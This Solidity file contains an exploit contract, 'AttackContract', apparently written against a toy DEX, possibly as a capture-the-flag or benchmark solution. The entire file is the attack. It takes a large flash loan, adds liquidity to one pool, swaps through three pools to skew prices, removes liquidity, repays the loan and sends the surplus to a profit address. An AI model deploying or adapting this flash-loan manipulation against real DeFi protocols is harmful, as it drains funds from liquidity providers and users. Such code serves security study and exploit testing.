// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IIERC20 {
    function transfer(address to, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
    function balanceOf(address owner) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface ISimpleDEX {
    function flashLoan(uint256 amount, address token) external;
    function swap(uint256 ammIndex, uint256 amountIn, bool isToken0) external;
    function getPrice(uint256 ammIndex) external view returns (uint256);
    function addLiquidity(uint256 ammIndex, uint256 amount0, uint256 amount1) external;
    function removeLiquidity(uint256 ammIndex, uint256 lpAmount) external;
}

contract AttackContract {
    address token0;
    address token1;
    address token2;
    address dex;
    address profitReceiver;

    function attack(address _token0, address _token1, address _token2, address _dex, address _profitReceiver)
        external
    {
        token0 = _token0;
        token1 = _token1;
        token2 = _token2;
        dex = _dex;
        profitReceiver = _profitReceiver;

        ISimpleDEX(dex).flashLoan(100_000 ether, token0);
    }

    function executeOperation(uint256 amount, address token) external {
        require(msg.sender == address(dex), "only dex can call");
        uint256 swap_use = 1 ether;
        uint256 liq_use = amount - swap_use;
        IIERC20(token0).approve(dex, liq_use);
        ISimpleDEX(dex).addLiquidity(2, liq_use, 0);
        IIERC20(token0).approve(dex, swap_use);
        ISimpleDEX(dex).swap(0, swap_use, true);
        uint256 amount_token1 = IIERC20(token1).balanceOf(address(this));
        IIERC20(token1).approve(dex, amount_token1);
        ISimpleDEX(dex).swap(1, amount_token1, true);
        uint256 amount_token2 = IIERC20(token2).balanceOf(address(this));
        IIERC20(token2).approve(dex, amount_token2);
        ISimpleDEX(dex).swap(2, amount_token2, false);
        // End of triangle arbitrage
        ISimpleDEX(dex).removeLiquidity(2, 100);
        // Remove Liquidity
        IIERC20(token).approve(dex, amount);
        uint256 balance = IIERC20(token0).balanceOf(address(this));
        if (balance > amount) {
            IIERC20(token0).transfer(profitReceiver, balance - amount);
        }
    }
}
